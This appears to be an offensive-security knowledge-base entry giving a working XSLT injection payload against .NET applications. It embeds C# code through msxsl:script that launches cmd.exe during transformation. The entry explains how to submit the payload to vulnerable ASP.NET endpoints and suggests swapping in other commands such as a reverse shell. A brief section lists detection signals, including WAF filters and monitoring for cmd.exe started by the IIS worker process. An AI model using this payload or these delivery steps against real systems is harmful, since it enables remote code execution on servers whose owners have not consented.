---
id: 12aa679c-9079-4e91-9a3a-bc37164bb36b
name: Malicious-XSLT-for-DotNET-RCE
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:41.608263+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - xslt-injection
  - rce-payload
  - dotnet-exploit
validated: true
---

# Malicious-XSLT-for-DotNET-RCE

## Code

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
  </xsl:stylesheet>
```

## Description

This XSLT stylesheet is a malicious payload for injecting into .NET XML processing endpoints. It embeds C# code via <msxsl:script> that executes System.Diagnostics.Process.Start("cmd.exe") when the ToShortDateString function is called during transformation, achieving remote code execution. The stylesheet transforms an <ArrayOfTest> XML structure into an HTML table, masking the exploit as legitimate output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| TestDate | Input date string passed to the C# function (triggers execution) | 2023-01-01 |

No attacker-specific variables; customize the Process.Start command inside the CDATA for different payloads (e.g., reverse shell).

## Usage

Embed this stylesheet as the root of an XML document submitted to a vulnerable .NET endpoint via POST (e.g., using [[commands/curl-inject-xslt-xml]]). Ensure the XML body includes elements like <ArrayOfTest><Test><TestDate>dummy</TestDate></Test></ArrayOfTest> to invoke the template. Used in web exploitation scenarios targeting ASP.NET apps with unsafe XSLT handling.

## Detection

- WAF or input filters blocking <msxsl:script> or CDATA with C# keywords like Process.Start.
- Application logs showing XSLT transformation errors or unusual script execution.
- Process monitoring for cmd.exe spawned from w3wp.exe (IIS worker process).
- XML parsing logs revealing msxsl namespace usage.

## Related

- [[procedures/Native-DotNET-XSLT-Injection-RCE]]
- [[techniques/XSL Script Processing|T1220]]
